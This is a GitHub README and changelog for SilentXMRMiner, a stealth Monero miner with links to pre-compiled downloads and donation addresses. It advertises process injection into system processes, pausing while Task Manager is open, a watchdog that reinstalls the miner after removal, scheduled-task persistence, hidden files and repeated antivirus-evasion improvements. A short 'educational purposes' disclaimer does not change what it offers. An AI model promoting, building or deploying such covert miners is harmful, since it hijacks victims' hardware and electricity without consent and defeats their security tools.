
<img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">

# SilentXMRMiner v1.2.3 - Based on Lime Miner v0.3


## Main Features

* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.5.
 
* Codedom - No need for external libraries to compile

* Injection (Silent) - Hide payload behind another process

* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)

* Idle Mining - Can be configured to mine with a different Max CPU when computer is idle
  
* Stealth - Pauses the miner while Task Manager, Process Hacker or Process Explorer is open

* Watchdog - Replaces the miner if removed and starts it if closed down

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases

## My Other Miners

[Silent ETH (Ethereum) Miner](https://github.com/UnamSanctam/SilentETHMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/wiki) or at the top of the page.

## Changes

### v1.2.3 (10/04/2021)
* Fixed watchdog temporary path
* Updated injector
* Readded injector options svchost.exe and conhost.exe
* Decreased injector detections
* Improved error handling
### v1.2.2 (09/04/2021)
* Fixed crash when some connections are blocked by the government/ISP in places like Turkey or China
### v1.2.1 (09/04/2021)
* Fixed minor injection option bug
### v1.2 (09/04/2021)
* Fixed critial bug on some Windows systems
* Added Task Scheduler startup when miner has administrator privileges
* Replaced and improved injector
* Added advanced options form
* Added debug option to display errors for testing
* Added ability to obfuscate watchdog
* Fixed miscellaneous bugs
### v1.1 (31/03/2021)
* Updated miner
* Improved miner performance
* Recoded injector and watchdog from VB to C#
* Decreased antivirus detections
* Added built-in function name obfuscation
* Added Process Hacker and Process Explorer to stealth targets
### v1.0.3 (27/03/2021)
* Updated Watchdog
* Improved injector workflow reliability
* Changed encryption since the code was detected
### v1.0.2 (19/03/2021)
* Added 0% Max CPU option
* Increased salt lengths
* Improved Watchdog implementation
* Improved persistance
### v1.0.1 (14/03/2021)
* Removed some injection options due to new Windows protections
### v1.0 (12/03/2021)
* Updated miner
* Decreased antivirus detections
* Added a watchdog that replaces the miner if removed and starts it if closed down
* Added anti-sleep
* Stopped the command window from showing briefly when started
* Fixed bugs
### v0.9 (02/02/2021)
* Updated miner
* Greatly decreased antivirus detections
* Idle Max CPU, added customizable Max CPU usage while the miner is idle
* Idle Wait, added customizable time to wait before the miner is idle
* Stealth, currently pauses the miner while Task Manager is open
* Start Delay, added a customizable start delay before the miner is injected and starts, decreases detection by a lot
* Hide file, can now choose to hide the copied miner file when "Install" is enabled
* Now hides the library folder
* Encrypted all strings
### v0.8.1 (07/01/2021)
* Improved AV bypass
* Reverted back to .NET Framework 4.5
* Fixed bug that stopped miner from injecting
* Improved file size
* Fixed incorrect scaling with some system languages
### v0.8 (04/01/2021)
* Updated miner
* Fixed bugs
* Lowered requirement to .NET 4.0
* Added SSL/TLS option
* Added custom parameter option
* Increased miner performance
### v0.7.1 (09/10/2020)
* Fixed a bug
### v0.7 (08/10/2020)
* Updated miner
* Added help tooltips to clarify options
* Fixed bugs
* Reworked some code
### v0.6 (21/04/2020)
* Updated miner
* Added custom Idle option to miner (Starts mining after 15 minutes of inactivity and stops when active again)
* Added more options in the builder (Enable/Disable CPU, Nicehash and Idle mining)
* Fixed driver paths
* Reworked some code
### v0.5 (09/04/2020)
* Updated miner
* Massively improved file size by compressing libraries
### v0.4 (18/12/2019)
* Updated miner
* Improvement to non-GPU enabled filesize
### v0.3 (10/12/2019)
* Updated to work with the new Monero fork
* Added toggle to enable/disable GPU mining
### v0.2 (05/08/2019)
* Added more injection process choices
* Added Max CPU choice
### v0.1 (03/08/2019)
* Inital release

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1qu9rvkx7tjw9u003chtwfuf6s42fp3lmcfttk7f

ETH: 0x756b84fe97fB9880B02BDcd33cA58147E56d33a8
